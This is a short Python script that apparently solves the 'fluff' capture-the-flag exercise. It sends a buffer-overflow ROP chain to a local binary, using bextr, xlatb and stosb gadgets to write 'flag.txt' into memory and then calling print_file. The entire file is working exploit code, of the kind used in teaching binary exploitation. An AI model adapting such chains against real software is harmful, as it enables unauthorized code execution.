import struct
import subprocess

def set_flag_char(base: int, offset: int) -> bytes:
    # ROP Gadget: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx;
    rdx_val = struct.pack('<Q', 0x004000) # 40 == 64bits to extract from rcx; 00 offset in rcx to start from
    rcx_correction = 0x3ef2
    rcx_val = struct.pack('<Q', base + offset - rcx_correction)
    pop_rdx_rcx_add_rcx_bextr = struct.pack('<Q', 0x0040062a) + rdx_val + rcx_val

    # ROP Gadget: xlatb
    xlatb = struct.pack('<Q', 0x00400628)

    # ROP Gadget: stosb
    stosb = struct.pack('<Q', 0x00400639)

    return pop_rdx_rcx_add_rcx_bextr + xlatb + stosb

def main():
    elf = './fluff'

    padding = b'A'*40
    flag_addr = struct.pack('<Q', 0x601a00)

    # Store b'flag.txt' in memory byte by byte
    set_flag_chain = b''
    flag_str = b'flag.txt'
    str_addr = [0x4003c8, 0x4003c1, 0x4003d6, 0x4003cf, 0x4003c9, 0x4003d8, 0x4006c8, 0x4003d8]
    rax = 0x0b # Value in rax in first iteration of loop due to program's state
    for char, addr in zip(flag_str, str_addr):
        set_flag_chain += set_flag_char(addr, -rax) # Need to offset by value in rax
        rax = char # Update due to rax register now being a value from b'flag.txt'

    # Add final ROP gadgets to pop b'flag.txt' address into rdi, then print_file
    pop_rdi = struct.pack('<Q', 0x004006a3) + flag_addr
    print_file = struct.pack('<Q', 0x00400620)

    # Combine all ROP gadgets and run subprocess
    payload = padding + pop_rdi + set_flag_chain + pop_rdi + print_file
    p = subprocess.run(elf, input=payload)

if __name__ == '__main__':
    main()
